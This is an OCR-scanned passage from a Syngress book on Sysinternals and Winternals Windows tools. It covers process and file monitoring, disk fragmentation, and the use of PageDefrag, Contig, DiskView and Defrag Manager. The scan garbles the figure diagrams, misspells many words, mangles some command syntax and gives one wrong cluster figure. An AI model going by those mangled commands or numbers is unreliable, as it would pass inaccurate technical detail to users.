Vel When a user starts a process, the process inherits the token of a user so that 
the process runs in the same security context. 
17I Tokenmon allows you to see token activity in real time. 
Finding Open Resources and 
the Processes That Are Accessing Them 
PsTools is a package of command-line console programs. 
PsTools are extremely powerful, as it's easy to integrate them into batch 
files. 
PsList displays a list of processes that are running locally or on a remote 
computer. 
Fel PsFile shows only those files opened via a remote computer, not locally 
opened files. 
Handle lists all the handles that are opened by a process. 
By default, Handle shows only file handles, unless you use the -a argument, 
which will list all handles. 
17I Handles are not unique systemwide. 
Viewing All File Activity with Filemon 
V~ Filemon displays real-time file system activity on a local computer. 
You can use PsExec to launch Filemon in the System account so that you 
can witness file system activity during logons and logoffs. 
Vr 
Filemon is extremely useful is determining what programs are creating files. 


Computer Monitoring 9 Chapter 4 
215 
Q" Why can't I connect to a particular computer using any of the PsTools? 
A" Make sure the computer you are trying to connect to is not behind a firewall. 
Most PsTools that connect to a remote computer connect on port 135 or 445. 
Q" How can I examine file system activity during a logon and a logoff?. 
A; Use PsExec to launch Filemon in the System account and make it interactive 
with the desktop. This will allow the program to continue running between 
logons and logoffs. 
Q" How do I monitor the installation of an application using Regmon? 
A" When starting Regmon, create a filter that matches the particular program that 
will be installing the application. When you install the application, P,.egmon 
should log only those Registry changes that this particular program made. 
Q" What is the filename for the log created during log boot mode in Regmon? 
A" The log will be saved in the System root, usually C', in a file named 
REGMON.LOG. 


218 
Chapter 5 9 Disk Management 
Introduction 
The Winternals team has developed a suite of disk tools that complement the utili- 
ties that already come standard with Windows. We are all familiar with the Disk 
Management Console available in Windows 2000 and subsequent versions; how to 
view drive properties; and how to use the disk defragmenting utility, Defrag. What 
many of us do not know is how to find extended information on all accessible vol- 
umes, what all of this new information means, and what to do with it. 
In this chapter, you will learn a better way to manage disk and file fragmentation 
on your volumes, as well as advanced methods using the Winternals tool, Defrag 
Manager.You will also see exactly how and where your files are stored on disk, what 
the volume utilization really is, and what options you have for optimization. Finally, 
you will discover a treasure-trove of difficult-to-find information on your disk vol- 
umes that you thought never existed. 
Managing Disk Fragmentation (Defrag 
Manager, PageDefrag, Contig, DiskView) 
A hard disk comprises many plate-like, circular, magnetic recording surfaces called 
platters. These platters are stacked one above the other in a spindle. To provide an easy 
addressing scheme for space in a hard disk, each platter is divided into a number of 
concentric tracks. These tracks are divided further into smaller parts known as sectors. 
A sector is the smallest unit of space that a program can access in a hard disk. These 
sectors are usually 512 bytes in size. However,.it is very cumbersome to access each 
sector while reading and writing data. Hence, the File Allocation Table (FAT) file 
system and the NT file system (NTFS), among others, group a number of sectors to 
form a cluster. The number of sectors per cluster depends on the size of the disk in 
question. In NTFS, cluster size can range from 512 bytes to 64 KB~in other words, 
from one sector per cluster, to 125 sectors per cluster. Generally, larger disks use 
larger cluster sizes. 
Clusters are the default allocation units in NTFS and FAT file systems, and all 
the sectors in a cluster are contiguous. Hence, each cluster is a continuous block of 
space ranging in size from 512 bytes to 64 KB. Whenever a file is to be stored on a 
hard disk, space is allocated in terms of minimum number of clusters that are 
required to store the file. For instance, in a disk whose cluster size is 512 bytes, a 
500-byte file will occupy one cluster. However, if the file size is 600 bytes, it occu- 
pies two clusters even though it does not need all of the space that's taken up by two 
clusters (1,024 bytes). This happens because a cluster is viewed as the minimum pos- 

sible allocation unit by the file systems and hence allotment of a fraction of cluster is 
not permitted. 
Now, let's discuss how fragmentation occurs in hard disks. For this example, 
imagine you have a very small hard disk comprising 16 clusters. Initially, the disk is 
empty. Suppose you create a file, X, that occupies three clusters, allocated to the file 
as shown in Figure 5.1. 
Figure 5.1 Cluster Allocations for File X 
10 
11 
10 
Y 
11 
V 
13 14 15 16 
12 
Now you create another file,Y, which takes up 10 clusters.You still have 13 con- 
tiguous free clusters left, so out of these 13 contiguous clusters, 10 are allocated to 
the file Y, as shown in Figure 5.2. 
Figure 5.2 Cluster Allocations for File Y 
10 
Y 
12 
V 
13 
V 
14 15 16 
2 
• 
If file X is deleted, the clusters that X occupies are deallocated. As you can see, 
you now have six free clusters in total, but some of these clusters are contiguous. 
Figure 5.3 depicts this situation. 
Figure 5.3 Deletion of File X 
1 
2 
3 
4 
5 
Y Y 
6 
Y 
7 
Y 
11 
Y 
12 
Y 
13 
V 
14 15 16 
Disk Management 9 Chapter 5 
219 
If you create a file, Z, that consumes six clusters, it will be spread across the 
freely available clusters. This splits the Z file into a number of parts similar to what is 
shown in Figure 5.4. Each part of this split file is known as a fragment. 

220 
Chapter 5 9 Disk Management 
Figure 5.4 Cluster Allocations for File Z 
?. 
Y 
10 
Y 
11 
Y 
12 
Y 
13 
Y 
14 
Z 
15 ]16 
zlz 
This example is highly simplified. In real-world situations, files can consume 
thousands of clusters, and hence, fragmentation is more prominent. High levels of 
fragmentation can occur on a disk due to multiple file creation, deletion, and move- 
ment operations over time. In reality, file fragments can occupy clusters that are 
located in different tracks or even on different platters of the physical hard disk! 
Now, let's discuss how fragmentation can degrade system performance. Imagine a 
situation where a large file is highly fragmented and spread over several clusters that 
are physically far apart. If this file needs to be read, the hard disk's reading head must 
skip over various tracks to read a single file. This situation worsens when clusters 
present in different platters need to be read! This increases the hard disk's seek time, 
and system performance can degrade perceptibly. This is where defragrnentation 
comes to our rescue! 
Defragmentation is the process of rearranging fragmented files so that they occupy 
contiguous clusters. The defragmentation process can take up a lot of time because 
the defragrnenting program needs to analyze the whole disk to find the scattered file 
fragments and rearrange them. Many of us use the Disk Defragmenter tool bundled 
with Windows to accomplish this task. Although it is easy to use, Disk Defragrnenter 
lacks the ability to perform some essential functions that I will describe in subse- 
quent sections. 
Managing Pagefile Fragmentation 
One of the shortcomings of Windows' Disk Defragmenter is that it cannot defrag 
some system files that have restricted or privileged access. Some of these files are: 
pagefile.sys, which is used to implement system virtual memory 
hiberfil.sys, which is used to implement the hibernation feature available in 
Windows XP and subsequent versions 
Registry hives (SAM, SYSTEM, SECURITY, SOFTWARE, and 
.DEFAULT), which store the actual Registry data 
Log files (EVT files) created by the Event Viewer tool bundled in Windows 
www.syngress.com 

Disk Management 9 Chapter 5 
221 
The operating system uses all of these files constantly, and therefore, you cannot 
defragment them. However, their size can decrease or increase depending on the 
usage by the operating system. This results in the fragmentation of these paging files 
and Registry hives, which can lead to noticeable performance degradation in the 
system. Using Sysinternals' PageDefrag, you can defrag these special files. Figure 5.5 
shows the PageDefrag graphical user interface (GUI). 
Figure 5.5 The PageDefrag GUI 
PageDefrag displays all of the paging files and Registry hives, along with the 
number of clusters they occupy as well as the number of fragments. In Figure 5.5, 
you can see that hiberfil.sys and pagefile.sys have 381 and 8 fragments, respectively, 
and that the Registry hive files have one fragment each. These numbers can vary 
from one system to another. Since you cannot defragment these files while they are 
in use, PageDefrag defrags them when the system boots up, before these files are 
loaded into memory. Therefore, PageDefrag requires a reboot to complete the 
defragmentation process. To defrag these files, you need to click the Defragment at 
next boot radio button, located in the Defragmentation Control option box. 
After clicking this radio button, click on OK to close PageDefrag; you will then 
need to reboot the system manually. During boot-up, PageDeffag will run and will 
attempt to defragment these special files. 
Another option present in PageDeffag is Defragment every boot. Selecting 
this option configures PageDeffag to run at every boot-up. PageDeffag also provides 
an option to cancel the deffagment procedure upon every system boot-up (Don't 

222 
Chapter 5 9 Disk Management 
defragment (uninstall)), and a timeout feature that will cancel the &fragment 
operation after a certain user-supplied length of time (Defrag abort countdown). 
Removing PageDefrag Manually 
PageDefrag use the BootExecute key in the HKEY_LOCAL_MACHINE\ 
SYSTEM\CurrentControlSet\Control\Session Manager branch in the Registry. The 
programs listed in the BootExecute key will start during system boot-up. By default, 
the value in the BootExecute key will be autocheck autochk *. This entry corresponds 
to Autochk.exe, the disk-checking program, through which it will launch at every 
boot-up. 
PageDefrag alters and adds itself to this key so that it can start at boot-up after 
Autochk.exe completes. When you select the Defragment at next boot option, 
PageDefrag modifies the BootExecute value to the following: 
autocheck 
autochk 
* 
pgdfgsvc 
D 1 -o 
When you select Defragment every boot, the modified value will look like 
this: 
autocheck 
autochk 
* 
pgdfgsvc 
D 1 
Selecting Don't defragment (uninstall) will restore the BootExecute key to its 
default value. However, in some rare cases, PageDeffag may continue to run at boot- 
up even after you have configured it not to run. In these cases, you need to restore 
the default BootExecute Registry value. Here's how to do that: 
Select Start I Run, type regedit, and press Enter to open the Registry 
Editor. 
9 Navigate to the HKEY_LOCAL_MACHINE\SYSTEM\ 
CurrentControlSet\Control\Session Manager branch by clicking the + 
symbol preceding the branch names. 
9 Locate the BootExecute key in the right-hand pane of the Registry Editor. 
Right-click on this key; then click on Modify to open the Edit dialog box. 
9 
Clear any old values that may be present in the Value Data text box. Type 
autocheck autochk * in the text box and click OK. 
Exit from the Registry Editor, and restart the system make the changes take 
effect. This should stop the execution of PageDeffag at boot up 
www.syngress.com 

Disk Management 9 Chapter 5 
223 
Optimizing Frequently Accessed Files 
As you saw earlier, Windows' Disk Defragmenter takes a lot of time to deffagment a 
hard disk completely. The length of time it takes to deffag a volume depends on sev- 
eral factors, including volume size, how fragmented the files are, system resources, and 
so on. During the deffag operation, the deffag tool is toiling away on the hard disk, 
which can degrade a system's overall performance and affect other disk I/O opera- 
tions. Hence, you should deffag disks during low-use periods. If the system is usually 
busy--if it's a file server, for instance--the degradation in disk I/O performance is 
not viable. Moreover, you may need to defrag only specific files rather than the whole 
disk. In many cases, it is enough to defrag only frequently used or large files. The 
built-in Windows Disk Defragmenter cannot act with this level of granularity, but the 
Contig tool from Sysinternals nicely fits the bill here! Contig is a small command- 
line utility that can deffag an individual file or a group of files on a hard drive. 
To know what options are available in the program, simply type the command 
Contig.exe from the command prompt in the folder where the Contig tool is 
located. The output displayed should look like that shown in Code Listing 5.1. 
Code Listing 5.1 Options Available in Contig 
,, 
Contig vi.52 - Makes files contiguous 
Copyright (C) 1998-2005 Mark Russinovich 
Sysinternals - www. sysinternals, com 
Contig is a utility that relies on NT's built-in defragging support 
to make a specified file contiguous on disk. Use it to optimize execution 
of your frequently used files. 
Usage: 
Contig.exe [-v] [-a] [-s] [-q] [existing file] 
Or Contig.exe [-v] -n [new file] [new file length] 
-v: Verbose 
-a: Analyze fragmentation 
-q: Quiet mode 
-s: Recurse subdirectories 
As you can see from Code Listing 5.1, Contig has many options that are speci- 
fied by the switches listed inside the square brackets.You can use Contig to deffag- 

224 
Chapter 5 9 Disk Management 
ment a file and to analyze the fragmentation of a file. To do this, you should use 
Contig with the analyze fragmentation switch,-a, making the complete command 
Contig.exe-a filename. For example, here is the command to check a file named test- 
file.bmp present in the root directory: 
Contig.exe -a C:\testfile.bmp 
Code Listing 5.2 shows its output. 
Code Listing 5.2 Analyzing Files Using Contig 
Contig vi.52 - Makes files contiguous 
Copyright (C) 1998-2005 Mark Russinovich 
Sysinternals - www.sysinternals.com 
Processing c:\Testfile.bmp...c:\Testfile.bmp is in 2 fragments 
Summary : 
Number of files processed 
Average fragmentation 
: 
1 
: 2 frags/file 
Contig processes the file and displays the results as shown in Code Listing 5.2. 
You can deduce that the example file, testfile.bmp, contains two fragments. 
To get additional information about the file in question, you can use the verbose 
switch,-v, along with the -a switch. The syntax of the command with these two 
switches is Contig.exe-v-afilename. Thus, if you run the analyze command with the 
verbose switch for the example testfile.bmp file, the result will look like that shown 
in Code Listing 5.3. 
Code Listing 5.3 Using the Verbose Switch While Analyzing a File 
Contig vi.52 - Makes files contiguous 
Copyright (C) 1998-2005 Mark Russinovich 
Sysinternals - www. sysinternals, com 
Processing c : kTestfile .bmp: 
Scanning file... 
File size: 1440054 bytes 
c:\Testfile.bmp is in 2 fragments 

Disk Management 9 Chapter 5 
225 
Summary : 
Number of files processed 
Average fragmentation 
: 
1 
: 2 frags/file 
When you compare the output shown in Code Listing 5.3 with the output in 
Code Listing 5.2, you can find some additional information, such as the file size 
contained in the output. The verbose switch will provide much more information 
while actually performing a defrag than it will while simply analyzing a file, as you 
will see shortly. 
Once you have determined the fragmentation status of the files, the next step is 
to defrag them.You do this by providing the filename without any switches. Hence, 
the command to defrag the example testfile.bmp file is as follows: 
Contig.exe C:\testfile.bmp 
Code Listing 5.4 shows the output the program generates. 
Code Listing 5.4 Defragging a File Using Contig 
Contig vi.52 - Makes files contiguous 
Copyright (C) 1998-2005 Mark Russinovich 
Sysinternals - www.sysinternals.com 
Processing c:\Test~le.bmp... 
Summary: 
Number of ~les processed 
: 1 
Number of files defragmented: 1 
Average fragmentation before: 2 frags/file 
Average fragmentation after: 1 frags/~le 
After deffagmentation, the file will be in one piece, or one fragment. Here, using 
the -v switch provides additional information about the deffagmentation process. 
The syntax for this is: 
Contig. exe -v filename 
Hence, if you run the following command, the output will be as shown in Code 
Listing 5.5: 
Contig.exe -v C:\testfile.bmp 

226 
Chapter 5 9 Disk Management 
Code Listing 5.5 Additional Information Shown by Contig When Used with 
the Verbose Switch 
J 
Contig 
vi.52 
- Makes files contiguous 
Copyright (C) 1998-2005 
Mark Russinovich 
Sysinternals - www.sysinternals.com 
Processing c : \Testfile .bmp : 
Scanning file... 
Scanning disk... 
File 
is 352 physical clusters in length. 
File 
is in 2 fragments. 
Found a free disk block at 1045525 
of length 390 for entire file. 
Moving 352 clusters at ~le offset cluster 0 to disk cluster 1045525 
File 
size: 
1440054 
bytes 
Fragments before: 2 
Fragments after: 1 
Summary: 
Number of files processed 
: 1 
Number of files defragmented: 1 
Average fragmentation before : 2 frags/file 
Average fragmentation after: 1 frags/file 
From the output shown in Code Listing 5.5, you can see that verbose mode 
gives you a great deal of information. Here, Contig is searching for a contiguous 
block of unallocated clusters ~ee disk blocks) that can accommodate the file being 
defragmented. In this example, Contig found a contiguous block of clusters starting 
from an offset address of 1045525 that is large enough to accommodate the example 
file. Thus, Contig moves all the file fragments to this new block of clusters, thereby 
defragmenting the file. The difference between verbose mode and nonverbose mode 
is clearly visible from the examples shown in Code Listings 5.4 and 5.5. 
Defragmenting Multiple Files Using Contig 
You can use Contig to defragment multiple files by specifying the wildcard operators 
in the filename. For example, if you want to defrag all the dynamic link library 

Disk Management 9 Chapter 5 
227 
(DLL) files in the Windows directory, you can specify *.dll as the filename wildcard. 
Then the command would be: 
Contig.exe C:\Windows\*.dll 
To specify verbose mode, use the following: 
Contig.exe -v C:\Windows\*.dll 
These two commands instruct Contig to search for all the DLL files in the 
Windows directory, and then to defragment them. A drawback of using this syntax 
to deffag multiple files is that Contig will not look for the DLL files inside the sub- 
directories that may be present in the Windows directory. If you want Contig to 
search for and &flag files stored in subdirectories, you have to use the recurse subdi- 
rectories switch,-s, in the command. Therefore, the command would take one of the 
following two forms: 
Contig.exe -s C:\Windows\*.dll 
Contig.exe -v -s C:\Windows\*.dll 
The preceding commands instruct Contig to search for DLL files in the 
Windows directory and all the subdirectories inside it. 
Analyzing or defragging multiple files can often display too much information 
on-screen and may lead to confusion; generally, it is sufficient to have Contig per- 
form a summary of the task. In order to hide extra information displayed by Contig, 
you can use the quiet mode switch,-q, in the command. Therefore, if you want to 
analyze the fragmentation status of all DLL files in the Windows directory in quiet 
mode, the command would be: 
Contig.exe -q -a C:\Windows\*.dll 
Similarly, the command to defrag these files in quiet mode would be: 
Contig.eKe -q C:\Windows\*.dll 
~i~i The quiet mode switch, -q, will override the verbose switch, -v, if you 
~{ 
specify both of them together. 
www.syngress.com 

228 
Chapter 5 9 Disk Management 
Creating Optimized Files Using Contig 
You also can use Contig to create new files of a specified size, using the -n switch. 
While creating a new file, you must provide both the filename and the expected size 
of the file in the command. Contig then searches for a contiguous block of clusters 
that can accommodate the file to be created. If it finds a block, it creates the file, 
which is inherently optimized to a single fragment. For example, executing the fol- 
lowing command will create a text file on the C drive, of size 100000000 bytes 
(though slightly less than 100 MB, I will refer to the size as 100 MB for simplicity)" 
Contig.exe -n C:\Newfile.txt I00000000 
Note that you should specify the size in bytes. This command's output would 
look something like that shown in Code Listing 5.6. 
Code Listing 5.6 An Empty, Optimized File Created by Contig 
Contig vi.52 - Makes files contiguous 
Copyright (C) 1998-2005 Mark Russinovich 
Sysinternals - www.sysinternals.com 
Processing C: \Newfile.txt...C: \Newfile.txt was optimized to 1 fragment. 
Summary: 
Number of files processed 
: 1 
Number of files defragmented: 1 
Average fragmentation before: 1 frags/file 
Average fragmentation after: 1 frags/file 
You will now have an empty, 100 MB file on the C drive. One might think, 
what would be the use of this command, since all it does is create an empty file 100 
MB in size. The advantage is that the newly created text file is already optimized and 
it can hold 100 MB of data without becoming fragmented. If a user were to enter 
enough data into the file so that its size exceeded 100 MB, the file would become 
fragmented if there were no free clusters adjacent to the clusters used to store the 
optimized file. 

Disk Management 9 Chapter 5 
229 
Using DiskView to Locate Fragmented Files 
DiskView shows a graphical map of a hard disk. More specifically, it shows the exact 
location, in terms of cluster addresses, of the files in the disk. Along with this, it 
shows the fragmentation status of the files. Figure 5.6 illustrates the DiskView user 
interface. 
www.syngress.com 

230 
Chapter 5 9 Disk Management 
Figure 5.6 The DiskView User Interface 
You can obtain a graphical map of a volume by selecting the drive letter corre- 
sponding to that volume from the Volume drop-down list in the lower-left corner 
of the DiskView interface, and then clicking the Refresh button. DiskView will 
scan the selected volume and display a color-coded map. As you can see in Figure 
5.6, DiskView shows two graphical maps. The graphic in the lower portion is the 
summary view of the volume, and the graphic in the upper portion is the in-detail 
map showing each file cluster.You can browse the file system either by using the 
scroll bar in the upper window, or by clicking in the required area in the lower 
window. 
You also need to be aware of some color-coding that is relevant to this section, 
as it provides information about fragmentation: 
9 
Red areas in the map indicate fragmented files. 
9 
Blue areas indicate contiguous files. 
9 
Green areas indicate system files. 
9 
White areas indicate free space. 
9 
Yellow areas indicate currently selected clusters related to a file. 
You can access all available color codes for reference by selecting the Help I 
Legend menu option. Whenever you click on any area in the map in the upper 
www.syngress.com 

Disk Management 9 Chapter 5 
231 
window, DiskView will display the name of the file occupying that area in the 
Highlight text box. Because this file might be fragmented, you can track all the 
fragmented cluster blocks belonging to it by clicking the Show Next button next 
to the Highlight text box. Further, by double-clicking anywhere in the map in the 
upper window, you can obtain additional information, such as the file occupying the 
selected area of clusters, the number of fragments, and their cluster addresses.You also 
can zoom in and out on the graphical map using the zoom arrow keys. By zooming 
in, you can see the disk's individual clusters. 
DiskView is particularly valuable when you use it in conjunction with the 
Contig tool. As you can get a visual idea of a disk's storage through DiskView, you 
can easily find fragmented files in the disk. All you need to do is select the red areas 
in the lower graphical map in DiskView, and then click on areas in the upper map 
to find out which files are located there. Later, you can defrag these files using 
Contig. This method of file defragmentation saves a considerable amount of time, 
since you are only searching for severely fragmented files! 
Making Contig an Environment Variable 
By adding the Contig directory to the PATH environment variable, you can execute 
Contig even though it is not in its own directory. Just follow these steps: 
1. Select Start I Control Panel, and double-click on the System applet. 
2. In the System applet, click the Advanced tab, and then the 
Environment Variables button. 
3. Under the System variables section, select Path and click Edit. This 
opens the Edit System Variable window. 
4. In the Variable Value text box, add the path of the Contig directory at the 
end of the existing variable values. Make sure to type a semicolon (;) to 
separate the newly entered value from previous values. For example, if the 
Contig path is C:\ContigTool\Contig.exe, the text in the Variable Value 
text box would be %SystemRoot%\system32;%SystemRoot%; 
%SystemP, oot%\System32\Wbem;%SystemDrive%\ ContigTool. 
5. 
Click OK to confirm the changes, and click OK again to exit from the 
Environment Variables applet. 
The advantage of making Contig an environment variable is that you can use it 
in batch files or scripts directly. There is no need to navigate to the tool's directory 
using the cd command. 

232 
Chapter 5 9 Disk Management 
Advanced Disk Fragmentation 
Management (Defrag Manager) 
Because of their ever-increasing complexity and size, it is common for organizations 
to overlook the practice of defragmenting all of their workstations and servers, even 
though this practice is critical to maintaining a high level of performance and 
increasing the lifespan of hard drives. 
Fortunately, Winternals' Defrag Manager makes disk fragmentation management 
an easy and quick process. With Defrag Manager, you can defragment Microsoft 
Windows NT 4.0, 2000, 2000 Server, XP Professional, XP Professional x64 Edition, 
Server 2003, and Server 2003 x64 Edition systems. Defrag Manager also integrates 
with Microsoft Operations Manager (MOM) 2005. One of Defrag Manager's best 
features is its smart binding to Active Directory Organizational Units (OUs). This 
allows you to bind a schedule to an Active Directory OU whereby it will parse out 
all the computer objects in that OU and then track the licensing automatically. If 
you remove or add a workstation to that OU, Defrag Manager will automatically 
remove it from or add it to the schedule. 
Defrag Manager is a very safe and efficient defragmentation engine on all 
Windows systems. It utilizes Windows APIs to move files around on the drive, 
instead of relying on proprietary code for controlling the file system. The advantage 
of this is safety. If a file is going to be moved, it makes a lot of sense to tell Windows 
to move it instead of bypassing the built-in file system and moving it yourself. 
Although chances of corruption are rare, the extra benefit of using the built-in file 
system can prove beneficial in, say, a power failure in the middle of a defrag. 
Defrag Manager also features SmartPhase technology that constantly monitors 
system resources to provide a more balanced use of the CPU, memory, and hard- 
drive time, essentially sharing the resources more efficiently with other processes yet 
utilizing all available resources to get the job done quickly. And unlike the built-in 
defrag utility in Windows, Defrag Manager also works well on systems with very 
little free space. 
In short, Defrag Manager provides a feature set that allows large organizations to 
maintain all of their machines with minimal to no user disturbance. In this section, I 
will discuss how to install the product and I will provide some configuration examples. 
Installing Defrag Manager 
You can purchase licenses of Defrag Manager for servers, workstations, or both. 
Winternals also charges a yearly per-client maintenance fee that provides upgrades. 
The maintenance fee is not required, but any upgrades may require you to purchase 

Disk Management 9 Chapter 5 
233 
the licenses new.You may also want to purchase at least one copy of the Advanced 
Mode CD. 
To install the software you need a key, which is a specially formatted text file 
Winternals will send to you via email (to run a trial version of the software, you 
must contact Winternals to request a temporary key).You will notice that the instal- 
lation package is quite large (about 65 MB). This is because it includes a utility to 
create a bootable CD that you can use to defragment the hard disk through a 
WinPE interface. This utility can defragment everything, including the pagefile, the 
MTE and the hard drive itself, with astonishing speed. This is especially useful when 
a computer will not boot due to very high fragmentation. 
You do not need a dedicated server to install Defrag Manager; a simple worksta- 
tion is sufficient. Depending on how you schedule your defragmentation .jobs, very 
little activity takes place on the admin console. Just run through the install. For the 
examples I'H show you on these pages, I went with all the defaults, installing the 
software to C:\Program Files\Winternals\Defrag Manager (see Figure 5.7). 
Figure 5.7 Defrag Manager Defaults 
Here is a quick overview of the executables: 
9 
defragnt.exe This file is the command-line defragmentation utility (dis- 
cussed later in this section). 
9 
dfrgetrl.exe Defrag Manager uses this file internally to control the 
dfrgmgr.exe process when run through a schedule. 

234 
Chapter 5 9 Disk Management 
9 dfrgmgr.exe The heart of Deffag Manager, this executable is deployed 
remotely through the Deffag Manager console. This executable also has a 
command line that will allow you to install or remove the Deffag Manager 
Agent service. When you install the service on a client, it will place 
dffgmgr.exe in the root of the Windows directory. This process actually 
runs the &fragmentation process. 
9 dfrgmgr.msc This is the Windows Management Console file that allows 
you to administer Defrag Manager. 
9 MakeISO.EXE This executable allows you to create the Advanced Mode 
CD. 
Reports.exe Deffag Manager uses this executable internally for gener- 
ating reports. 
The logfiles directory stores the locally downloaded logfiles. This is nothing 
more than a cache of the client logfiles. 
Running the Defrag Manager Schedule Console 
After you install Defrag Manager, a program group named Winternals Defrag 
Manager is created, with two icons. The Create Advanced Mode CD icon allows 
you to create a bootable CD with a special stand-alone version of Defrag Manager, 
and Defrag Manager itself. Figure 5.8 shows Defrag Manager's New Schedule 
Wizard. 
Figure 5.8 Defrag Manager's New Schedule Wizard 

Disk Management 9 Chapter 5 
235 
When you run Defrag Manager for the first time, it will prompt you to create a 
new schedule. The main purpose of the Defrag Manager Schedule Console is to 
create and maintain schedules. I created a sample schedule with the steps outlined in 
this section. 
In this first step, you will need to create a name for your schedule and, option- 
ally, a description. Then you need to select the jobs' "run as" account. It is important 
that you select an account that has local administrator rights on all workstations and 
servers. The best practice on a domain is to use a domain admin account or a service 
account whose password does not change. When Deffag Manager runs on the work- 
station or server it will run the dfrgctrl.exe process (which controls the dfrgmgr.exe 
process) as this account, so if the password changes, you will need to redeploy the 
schedule. 
Next, you need to define how the client will be deployed.You can have the 
client automatically deployed through the admin$ share and then optionally removed 
when the job is completed, for a zero footprint install (see Figure 5.9). 
Figure 5.9 Client Settings 
If you chose to disable the admin$ share for security reasons, you can specify a 
different share or deploy the client manually, and then use the preinstalled agent 
option. To deploy the client manually you can create a GPO or package that uses the 
dfrgmgr.exe executable, with the following arguments: 
usage- dfrgmgr -i [-s <server>]<ip address>] 
[-p port] 
[-k password [-n 
name ] ] 

236 
Chapter 5 9 Disk Management 
dfrgmgr -u 
-i 
Installs Defrag Manager agent 
-s 
SpeciHes that connections will only be accepted from a 
particular machine or IP address. 
-p 
SpeciHes port number to use (default is 52322) 
-k 
SpeciHes password to use (default is none) 
-n 
SpeciHes computer name as speciHed in schedule 
-u 
Uninstalls Defrag Manager agent 
For example, to install the client as a service on the machine that will run all the 
time, listening on port 52322, you simply run the following: 
Dfrgmgr-i -k defragpassword 
This will permanently install the client to the workstation or server as a service 
that will listen to the command on port 52322 with a password of defragpassword. 
Now, in the New Schedule Wizard, select the Use TCP/IP with preinstalled 
agent option. 
Please note that the service runs in the local system account, and you should 
leave this setting as is. The actual defrag process will run as SYSTEM, and the 
dfrgctrl.exe process will run as the account specified in the Run as box. Also note 
that this service uses minimal resources and it is simply waiting for a command on a 
TCP/IP port from the management console. 
The disconnected client mode is intended for laptops or workstations that are 
not always on the network and will not be able to receive updated schedules. This 
adds additional functionality to the scheduling but does not allow you to manually 
start an analysis or defrag from the Defrag Manager Schedule Console, nor will it 
display the process, even if the device is on the network. 
The options shown in Figure 5.10 enable you to add idle time and power man- 
agement to the Disconnect client mode. The idle time is especially useful as a sort of 
screensaver mode. Just set it to start the task after being idle for, say, 30 minutes, and 
then have it continue to retry for the next 480 minutes (eight hours). Now, when- 
ever the laptop or the workstation is idle for more than 30 minutes within eight 
hours after the schedule is initiated, the defrag process will kick off.You may also 
want to check the Stop the task if the computer ceases to be idle button to 
prevent the computer from defragmenting while in use. 
www.syngress.com 

Disk Management 9 Chapter 5 
237 
Figure 5.10 Disconnected Mode Settings 
Figure 5.11 is an example of what Deffag Manager creates as a scheduled task on 
the server or workstation that runs the management console. As you can see, the task 
runs the dffgctrl.exe process as the user you specify, which ultimately runs 
dfrgmgr.exe. 

238 
Chapter 5 9 Disk Management 
Figure 5.11 Sample Scheduled Task 
The next step is to set up the priority and some other options relating to the 
defragmentation process (see Figure 5.12). It is always best to run the defragmenta- 
tion process as a low priority. 

Disk Management 9 Chapter 5 
239 
Figure 5.12 Options 
You can instruct the deffag process to deffagment volumes simultaneously. This is 
a unique feature in Defrag Manager and may be a benefit in some environments. 
You also can use the Aggressively consolidate free space option to create larger 
chunks of flee space on machines. However, this may also reduce the performance of 
client machines. In general, unless the machines have free-space issues or easily frag- 
ment due to very large files, you should not use this option. 
If you select Defragment registry and paging files at the next system 
restart, Defrag Manager will add pgdfgsvc C 1 -o to the HKEY_LOCAL_ 
MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute 
boot key. This command will deffag the pagefile on the C drive and then remove 
itself after successful completion. 
Other options are to show the icon in the system tray during deffagmentation 
and to allow nonlocal administrators to pause or stop the defragmentation process. 
Most of the time, you will want to hide this icon completely to keep the defrag- 
mentation as quiet as possible to end users. 
If you want to stop the defragmentation after a period, you can set that on the 
Options page as well. Remember that the deffagmentation will completely start over 
again every time you run it, but if 20 percent of the hard drive has already been 

240 
Chapter 5 9 Disk Management 
deffagmented, assuming no additional fragmentation has occurred on that drive, the 
deffag will pass over this area quickly. 
The next page of the New Schedule Wizard allows you to exclude files, directo- 
ries, and entire volumes from the deffagmentation process (see Figure 5.13). 
Generally, you will not need to exclude anything on a workstation, but you may 
want to on a server. For example, on a server running Exchange or SQL, you will 
want to exclude the folders with the data files in them. 
Figure 5.13 Exclusions 
The next page of the wizard is where you can specify where to keep the logs 
(see Figure 5.14) concerning the defrag process.You should keep the logs on the 
workstation for simplicity. Generally, there is no need to change these settings. 
Figure 5.14 Logging Options 
www.syngress.com 

Disk Management 9 Chapter 5 
241 
When the Defrag Manager Schedule Console synchronizes with clients, it will 
download the log files. These log files contain a graphical display of the defragmenta- 
tion, along with any errors. 
The next step in the wizard concerns notifications (see Figure 5.15).You can 
send an email to whomever you want through SMTP for clients that error or for 
every client that successfully finishes.You may also turn this feature completely off. 
Figure 5.15 Notifications 
The final step of the wizard is to select the computers you want to include in 
the schedule (see Figure 5.16). Just click on Add and you can type in the names of 
the workstations or servers you want to include, or you can browse for them. 
www.syngress.com 

242 
Chapter 5 9 Disk Management 
Figure 5.16 Adding Computers 
If you will be using Deffag Manager's SmartBind feature (covered in the next 
section) to connect to an OU in your company's Active Directory installation, you 
do not have to select any computers. Just click Finish. 
Adding Workstations and Servers to Schedules 
Now that you have created a schedule, you will want to add workstations and servers 
to it.You can do this in three ways: by dragging and dropping workstations, by right- 
clicking the schedules and selecting Add Computer, or by binding it to an Active 
Directory OU. 
To use the SmartBind feature mentioned in the preceding section, you must 
right-click on the Active Directory icon in the manager and connect to your 
domain; then you can drag-and-drop any OU onto your schedule. This will bind 
that OU to that schedule.You will see your license count increase as Defrag 
Manager scans the OU for workstations and servers. If you want it to scan nested 
OUs, you will need to go into the schedule's properties after it has finished discov- 
ering and select the Bind to nested OUs option. When you use the SmartBind 
feature it will clear any manual computer adds and will not allow additional com- 
puters to be added.You should create multiple schedules for different OUs and 
manual computer additions.You can copy and paste schedules right inside the man- 
ager console. 
www.syngress.com 

Disk Management 9 Chapter 5 
243 
The biggest benefit of the SmartBind feature is that it will monitor the OUs 
that it binds to for additions and deletions and automatically update your license 
count. 
To remove a schedule from being bound to an OU, you must uncheck 
SmartBind OU in the General tab of the schedule's properties. This will leave you 
with a blank schedule that you must bind to a different OU (or you can add com- 
puters manually). 
Working with Schedules 
Once you have set up your schedules, you can sit back and wait for them to kick off 
or you can manually run an analysis or defrag against all the computers in each 
schedule. For schedules to run, the server or workstation with the manager console 
installed on it must be operational, with the exception of disconnected clients. To 
run an analysis or defrag of a machine or an entire schedule manually, just right-click 
